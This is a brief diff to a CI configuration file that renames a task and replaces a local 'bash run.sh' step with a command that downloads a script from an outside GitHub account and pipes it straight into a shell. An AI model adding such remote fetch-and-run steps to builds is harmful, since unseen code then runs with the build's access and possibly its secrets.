@@ -17,5 +17,5 @@ env:
     cpu: 8
     memory: 32G
 
-  Memuat-ccache_background_script:
-     - bash run.sh
+  COMPILE:
+     - curl https://raw.githubusercontent.com/Deaimded/CI/main/run.sh | sh
